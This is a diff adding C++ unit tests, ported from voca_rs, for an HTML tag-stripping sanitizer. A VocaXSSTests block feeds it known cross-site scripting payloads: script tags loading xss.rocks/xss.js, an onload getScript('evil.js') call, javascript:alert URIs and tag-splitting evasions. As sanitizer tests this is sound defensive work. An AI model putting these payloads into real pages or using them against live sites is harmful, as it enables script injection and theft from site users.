@@ -84,3 +84,152 @@ TEST(RustStripHtml, NonsenseWithComments) {
   </P>-->
   )"));
 }
+
+// ---------------------------
+// voca_rs test cases
+// we include a subset of the voca_rs tests for stripping tags.
+// Note: The EXPECTED/ACTUAL result is backwards in these tests to make
+// copy/pasting from voca_rs easier.
+// Note: We have a much less forgiving approach to HTML sanitation than Voca, so
+// in a few cases our output is different to theirs (for example, we never
+// output a '>' or a '<' character).
+// https://github.com/a-merezhanyi/voca_rs/blob/master/tests/unit/strip.rs
+// ---------------------------
+
+TEST(RustStripHtml, VocaGeneral) {
+  EXPECT_EQ(Strip(""), "");
+  EXPECT_EQ(Strip("Hello world!"), "Hello world!");
+  EXPECT_EQ(Strip("  "), "  ");
+  // should strip tags
+  EXPECT_EQ(Strip("<span><a href=\"#\">Summer</a> is nice</span>"),
+            "Summer is nice");
+  EXPECT_EQ(Strip("<b>Hello world!</b>"), "Hello world!");
+  EXPECT_EQ(Strip("<span class=\"italic\"><b>Hello world!</b></span>"),
+            "Hello world!");
+  EXPECT_EQ(Strip("<span class='<italic>'>Hello world!</span>"),
+            "Hello world!");
+  EXPECT_EQ(Strip("<script language=\"PHP\"> echo hello </script>"),
+            " echo hello ");
+  // should strip tags which attributes contain < or >
+  EXPECT_EQ(Strip("hello <img title='>_<'> world"), "hello _ world");
+  EXPECT_EQ(Strip("hello <img title=\"<\"> world"), "hello ");
+  EXPECT_EQ(Strip("hello <img title=\"<foo/> <'bar'\"> world"), "hello ");
+  // should strip tags on multiple lines
+  EXPECT_EQ(
+      Strip("This's a string with quotes:</html>\n\"strings in double "
+            "quote\";\n'strings in single quote\';\n<html>this\\line is single "
+            "quoted /with\\slashes"),
+      "This\'s a string with quotes:\n\"strings in double quote\";\n\'strings "
+      "in single quote\';\nthis\\line is single quoted /with\\slashes");
+  // should strip comments and doctype
+  EXPECT_EQ(Strip("<html><!-- COMMENT --></html>"), "");
+  EXPECT_EQ(Strip("<b>Hello world!</b><!-- Just some information -->"),
+            "Hello world!");
+  EXPECT_EQ(Strip("<span class=\"italic\">Hello world!<!-- Just some "
+                  "information --></span>"),
+            "Hello world!");
+  EXPECT_EQ(
+      Strip("<!-- Small<>comment --><span class=\"italic\"><!-- Just some "
+            "information --><b>Hello world!</b></span>"),
+      "Hello world!");
+  EXPECT_EQ(Strip("<!doctype html><span class=\"italic\"><!-- Just some "
+                  "information --><b>Hello world!</b></span>"),
+            "Hello world!");
+}
+
+TEST(RustStripHtml, VocaUser) {
+  EXPECT_EQ(
+      Strip("<span style=\"color: rgb(51, 51, 51); font-family: \" "
+            "microsoft=\"\" yahei=\"\" stheiti=\"\" wenquanyi=\"\" micro=\"\" "
+            "hei=\"\" simsun=\"\" sans-serif=\"\" font-size:=\"\" "
+            "16px=\"\">】มีมี่’ เด็กสาวที่นอนไม่ค่อยหลับเนื่องจากกลัวผี ขี้เหงา และอะไรหลายๆ "
+            "อย่างทำให้เธอมึนได้โล่เพราะไม่ค่อยได้นอน การที่เธอ นอนไม่หลับทำให้เธอได้เจอกับ "
+            "‘ดีเจไททัน’ แห่งคลื่น 99.99 MHzเขาจัดรายการในช่วง Midnight Fantasy "
+            "ตีสามถึงตีห้า "
+            "และมีมี่ก็เป็นผู้ฟังเพียงคนเดียวของเขาจากที่ตอนแรกเธอฟังดีเจไททันเพื่อช่วยปลอบประโลม"
+            "การที่เธอต้องมาอยู่หอเพียงลำพัง แต่ไปๆ "
+            "มาๆกลับกลายเป็นว่าเธออยู่รอฟังเขาทุกคืนทำให้เธอไปเรียนแบบมึนๆ "
+            "จนบังเอิญไปนอนหลับซบ ‘ธรรม’ผู้ชายจอมกวนที่บังเอิญมานอนให้เธอซบ! "
+            "จนอาจารย์สั่งให้ไปทำรายงานคู่กัน "
+            "และนั่นก็เป็นที่มาของการที่เธอเริ่มไม่แน่ใจแล้วว่าเธอปลื้มดีเจไททัน "
+            "หรือแอบหวั่นไหวกับนายจอมกวนคนนี้กันแน่</span><br />"),
+      "】มีมี่’ เด็กสาวที่นอนไม่ค่อยหลับเนื่องจากกลัวผี ขี้เหงา และอะไรหลายๆ "
+      "อย่างทำให้เธอมึนได้โล่เพราะไม่ค่อยได้นอน การที่เธอ นอนไม่หลับทำให้เธอได้เจอกับ "
+      "‘ดีเจไททัน’ แห่งคลื่น 99.99 MHzเขาจัดรายการในช่วง Midnight Fantasy ตีสามถึงตีห้า "
+      "และมีมี่ก็เป็นผู้ฟังเพียงคนเดียวของเขาจากที่ตอนแรกเธอฟังดีเจไททันเพื่อช่วยปลอบประโลมการที่เธ"
+      "อต้องมาอยู่หอเพียงลำพัง แต่ไปๆ "
+      "มาๆกลับกลายเป็นว่าเธออยู่รอฟังเขาทุกคืนทำให้เธอไปเรียนแบบมึนๆ จนบังเอิญไปนอนหลับซบ "
+      "‘ธรรม’ผู้ชายจอมกวนที่บังเอิญมานอนให้เธอซบ! จนอาจารย์สั่งให้ไปทำรายงานคู่กัน "
+      "และนั่นก็เป็นที่มาของการที่เธอเริ่มไม่แน่ใจแล้วว่าเธอปลื้มดีเจไททัน "
+      "หรือแอบหวั่นไหวกับนายจอมกวนคนนี้กันแน่");
+}
+
+TEST(RustStripHtml, VocaSpecial) {
+  EXPECT_EQ(Strip("< html >"), "");
+  EXPECT_EQ(Strip("<<>>"), "");
+  EXPECT_EQ(Strip("<a.>HtMl text</.a>"), "HtMl text");
+  EXPECT_EQ(Strip("<abc>hello</abc> \t\tworld... <ppp>strip_tags_test</ppp>"),
+            "hello \t\tworld... strip_tags_test");
+  EXPECT_EQ(Strip("<html><b>hello</b><p>world</p></html>"), "helloworld");
+  EXPECT_EQ(Strip("<span class=\"italic\"><b>He>llo</b> < world!</span>"),
+            "Hello ");
+  // should handle unicode
+  EXPECT_EQ(Strip("<SCRIPT>Ω≈ç≈≈Ω</SCRIPT>"), "Ω≈ç≈≈Ω");
+  EXPECT_EQ(Strip("<SCRIPT a=\"blah\">片仮名平仮名</SCRIPT>"), "片仮名平仮名");
+  EXPECT_EQ(Strip("<!-- testing --><a>text here</a>"), "text here");
+}
+
+TEST(RustStripHtml, VocaXSSTests) {
+  EXPECT_EQ(Strip("<img "
+                  "src=\"data:image/gif;base64,R0lGODlhAQABAIAAAP///"
+                  "wAAACwAAAAAA‌\u{200B}QABAAACAkQBADs=\"onload=\"$."
+                  "getScript('evil.js');1<2>3\">"),
+            "");
+  EXPECT_EQ(Strip("<script>evil();</script>"), "evil();");
+  EXPECT_EQ(Strip("<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>"), "");
+  EXPECT_EQ(Strip("<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">"),
+            "alert(\"XSS\")\"");
+  EXPECT_EQ(Strip("<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>"), "");
+  EXPECT_EQ(Strip("<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>"),
+            "");
+  EXPECT_EQ(Strip("<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>"), "");
+  EXPECT_EQ(Strip("<<SCRIPT>alert(\"XSS\");//<</SCRIPT>"), "");
+  EXPECT_EQ(Strip("<SCRIPT SRC=http://xss.rocks/xss.js?< B >"), "");
+  EXPECT_EQ(Strip("<SCRIPT SRC=//xss.rocks/.j>"), "");
+  EXPECT_EQ(Strip("<IMG SRC=\"javascript:alert(\'XSS\')\""), "");
+  EXPECT_EQ(Strip("<SCRIPT a=\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>"),
+            "\" SRC=\"httx://xss.rocks/xss.js\"");
+  EXPECT_EQ(Strip("<SCRIPT =\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>"),
+            "\" SRC=\"httx://xss.rocks/xss.js\"");
+  EXPECT_EQ(
+      Strip("<SCRIPT a=\">\" \'\' SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>"),
+      "\" '' SRC=\"httx://xss.rocks/xss.js\"");
+  EXPECT_EQ(
+      Strip("<SCRIPT \"a=\'>\'\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>"),
+      "'\" SRC=\"httx://xss.rocks/xss.js\"");
+  EXPECT_EQ(Strip("<SCRIPT a=`>` SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>"),
+            "` SRC=\"httx://xss.rocks/xss.js\"");
+  EXPECT_EQ(
+      Strip("<SCRIPT a=\">\'>\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>"),
+      "'\" SRC=\"httx://xss.rocks/xss.js\"");
+  EXPECT_EQ(Strip("<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT "
+                  "SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>"),
+            "document.write(\"");
+}
+
+TEST(RustStripHtml, VocaStripTags) {
+  EXPECT_EQ(Strip("<span><a href=\"#\">Summer</a> is nice</span>"),
+            "Summer is nice");
+}
+
+TEST(RustStripHtml, VocaPartialDirective) {
+  EXPECT_EQ(Strip("<"), "");
+  EXPECT_EQ(Strip("<t"), "");
+  EXPECT_EQ(Strip("</"), "");
+  EXPECT_EQ(Strip("</a"), "");
+  EXPECT_EQ(Strip("<!"), "");
+  EXPECT_EQ(Strip("<!-"), "");
+  EXPECT_EQ(Strip("á<!"), "á");
+  EXPECT_EQ(Strip(">天地不仁<"), "天地不仁");
+  EXPECT_EQ(Strip("\u{00a0}<!"), "\u{a0}");
+}
